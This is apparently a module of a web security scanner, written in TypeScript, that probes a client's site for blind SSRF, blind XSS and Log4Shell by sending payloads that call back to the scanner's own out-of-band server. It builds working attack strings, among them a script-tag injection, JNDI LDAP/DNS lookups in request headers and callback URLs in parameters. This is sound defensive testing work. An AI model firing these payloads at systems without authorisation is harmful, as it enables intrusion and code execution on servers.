import { newOobToken, oobBase, oobUrl, startInteractsh, waitForHits, type OobHit } from "../../oob.js";
import { withParam } from "../probes.js";
import type { AttackFinding, Family } from "./types.js";
import { pathOf, where } from "./types.js";

/** Parameter names that usually hold an address the server fetches (the same list as the SSRF check). */
const FETCH_PARAM = /^(url|uri|link|href|src|source|callback|callback_?url|webhook|webhook_?url|redirect(_?ur[il])?|return(_?url)?|next|dest(ination)?|target|feed|rss|image(_?url)?|img|avatar(_?url)?|photo|proxy|fetch|load|remote|host|domain|site|endpoint|document|doc|preview|thumbnail|render|import)$/i;
/** Text fields that may be shown later to staff (search terms, names, messages): where blind XSS lands. */
const STORED_PARAM = /^(q|query|search|s|name|first_?name|last_?name|message|msg|comment|subject|title|feedback|ref|utm_\w+)$/i;

interface Sent {
  label: string;
  kind: "ssrf" | "xss" | "log4j" | "header";
  url: string;
  how: string;
}

/**
 * Blind holes, proved by a callback to GLV's own callback server (see src/oob.ts): blind SSRF in
 * address parameters, blind XSS in fields staff read later, Log4Shell-style lookups in logged headers.
 * Every payload carries a unique label; a hit names exactly which request caused it. GET only.
 */
export const blindFamily: Family = {
  id: "blind",
  label: "Blind holes (out-of-band callbacks)",
  hint: "Needs GLV's callback server: OOB_BASE_URL (HTTP) or INTERACTSH_SERVER (DNS) in .env. Payloads carry a unique GLV address; a hole is reported only when the client's server calls it.",
  async run(fc): Promise<AttackFinding[]> {
    const { surface, http, log, ctx } = fc;
    const base = oobBase();
    const ish = await startInteractsh(ctx.signal, log);
    if (!base && !ish) {
      log("Blind holes: skipped, no callback server is set up (OOB_BASE_URL or INTERACTSH_SERVER)");
      return [];
    }
    const token = newOobToken();
    const sent: Sent[] = [];
    let n = 0;
    const label = (kind: Sent["kind"]) => `${kind}${(n++).toString(36)}${token.slice(0, 4)}`;
    const http1 = (l: string) => (base ? oobUrl(base, token, l) : `http://${l}.${ish!.domain}/`);
    const dnsName = (l: string) => (ish ? `${l}.${ish.domain}` : null);
    try {
      for (const t of surface.params) {
        if (http.left() < 3000 || sent.length > 150) break;
        if (FETCH_PARAM.test(t.param) || /^(https?:\/\/|\/\/)/i.test(t.value)) {
          const l = label("ssrf");
          const value = http1(l);
          sent.push({ label: l, kind: "ssrf", url: withParam(t, value), how: `the ${where(t)} of ${pathOf(t.url)}` });
          await http.get(withParam(t, value)).catch(() => undefined);
        }
        if (STORED_PARAM.test(t.param)) {
          const l = label("xss");
          const value = `"><script src="${http1(`${l}.js`)}"></script>`;
          sent.push({ label: l, kind: "xss", url: withParam(t, value), how: `the ${where(t)} of ${pathOf(t.url)}` });
          await http.get(withParam(t, value)).catch(() => undefined);
        }
      }
      // Logged headers: a JNDI lookup proves Log4Shell (needs the DNS/LDAP side of Interactsh); a plain
      // address in Referer or X-Forwarded-For proves something on the server fetches what it logs.
      for (const page of surface.pages.slice(0, 5)) {
        if (http.left() < 3000) break;
        const dns = dnsName(label("log4j"));
        const lj = sent.length;
        const headers: Record<string, string> = {};
        if (dns) {
          headers["user-agent"] = `\${jndi:ldap://${dns}/a}`;
          headers["x-api-version"] = `\${jndi:dns://${dns}/b}`;
          sent.push({ label: dns.split(".")[0], kind: "log4j", url: page, how: `the User-Agent and X-Api-Version headers sent to ${pathOf(page)}` });
        }
        const hl = label("header");
        headers.referer = http1(hl);
        headers["x-forwarded-for"] = dnsName(hl) ?? "127.0.0.1";
        sent.push({ label: hl, kind: "header", url: page, how: `the Referer header sent to ${pathOf(page)}` });
        await http.get(page, { headers }).catch(() => undefined);
        if (sent.length === lj) break;
      }
      if (!sent.length) return [];
      log(`Blind holes: ${sent.length} payloads sent, waiting for callbacks`);
      const hits: OobHit[] = await waitForHits(token, Math.min(20_000, Math.max(5000, http.left() - 2000)), ctx.signal, ish ? () => ish.hits() : undefined);
      const found: AttackFinding[] = [];
      for (const s of sent) {
        const mine = hits.filter((h) => h.label === s.label || h.label.startsWith(s.label));
        if (!mine.length) continue;
        const hit = mine[0];
        const what =
          s.kind === "ssrf"
            ? { rule: "attack:blind-ssrf", sev: "high" as const, title: `Blind SSRF: ${s.how} makes the server call out`, why: "The server fetched the GLV callback address we put in the parameter. It can be pointed at internal services and cloud metadata the same way (OWASP A10, CWE-918). Refuse user-supplied addresses, or allow only a fixed list of hosts and block private and metadata addresses." }
            : s.kind === "xss"
              ? { rule: "attack:blind-xss", sev: "high" as const, title: `Blind XSS: script sent in ${s.how} ran later`, why: "Script we put in a field was loaded by someone's browser later, usually an admin or staff screen that shows the stored value. An attacker can take over that staff account. Encode every stored value when it is shown (CWE-79)." }
              : s.kind === "log4j"
                ? { rule: "attack:log4shell", sev: "critical" as const, title: "Log4Shell-style lookup: a logged header makes the server call out", why: "A ${jndi:…} lookup in a header we sent reached GLV's callback server, so a logging library on the server runs lookups from request text (CVE-2021-44228 and its kind). Attackers turn this into running code on the server. Update Log4j to 2.17.1 or newer (or the affected library), and turn off message lookups." }
                : { rule: "attack:blind-header-fetch", sev: "medium" as const, title: `Something on the server fetches the address in ${s.how}`, why: "An address we sent only in a header was fetched from the client's network: an analytics, log or preview service follows header values. It can be used to reach internal addresses. Do not fetch addresses taken from request headers." };
        found.push({
          rule: what.rule,
          severity: what.sev,
          tag: s.kind === "xss" ? "injection" : s.kind === "log4j" ? "rce" : "ssrf",
          title: what.title,
          detail: `${what.why} How to reproduce: send ${s.url} and watch GLV's callback inbox for the label ${s.label}. Proof: a ${hit.protocol.toUpperCase()} callback from ${hit.from || "the client's network"} at ${hit.at}.`,
          pageUrl: s.url.split("?")[0],
          evidence: `${s.kind} payload ${s.label}\n${hit.protocol} callback from ${hit.from}: ${hit.request}`,
          key: `${what.rule}:${s.how}`,
        });
      }
      if (found.length) log(`Blind holes: ${found.length} confirmed by callbacks`);
      return found;
    } finally {
      ish?.close();
    }
  },
};
